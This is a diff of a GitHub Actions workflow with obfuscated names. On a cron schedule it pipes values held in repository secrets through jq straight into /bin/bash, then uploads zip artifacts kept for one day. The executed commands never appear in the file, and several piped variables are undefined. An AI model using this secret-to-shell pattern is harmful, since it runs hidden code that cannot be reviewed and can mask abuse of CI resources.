@@ -1,23 +1,28 @@
 name: dawangfengliang
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '20 2/6 * * *'
 
-jobs:  # 251
+  schedule:
+    - cron: '48 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: dawangfengliang
         env:
-          dbd932: ${{ secrets.dbd932 }}
+          abf2899: ${{ secrets.abf2899 }}
         run: |
-          echo $dbd932 | jq -r .uyndc407 | /bin/bash
-          echo $zsw9955 | jq -r .ibzr708 | /bin/bash
-          echo $cmff4437 | jq -r .mhfkk8 | /bin/bash
-          echo $fncog2 | jq -r .fy34039 | /bin/bash
-          echo $bnfs60467 | jq -r .m6 | /bin/bash
-          echo $a057 | jq -r .neha4920 | /bin/bash
-          echo $esgo1276 | jq -r .n9 | /bin/bash
+          printf '%s' "$abf2899" | jq -r .zw333 | /bin/bash
+          echo $s15668 | jq -r .vh771 | /bin/bash
+          echo $mzakg8 | jq -r .rt2228 | /bin/bash
+          printf '%s' "$wo0910" | jq -r .kcjud78650 | /bin/bash
+          printf '%s' "$qbx2" | jq -r .tc43212 | /bin/bash
+          printf '%s' "$whxl15" | jq -r .hhnnh4476 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aYeajxXX
+          path: "*.zip"
+          retention-days: 1
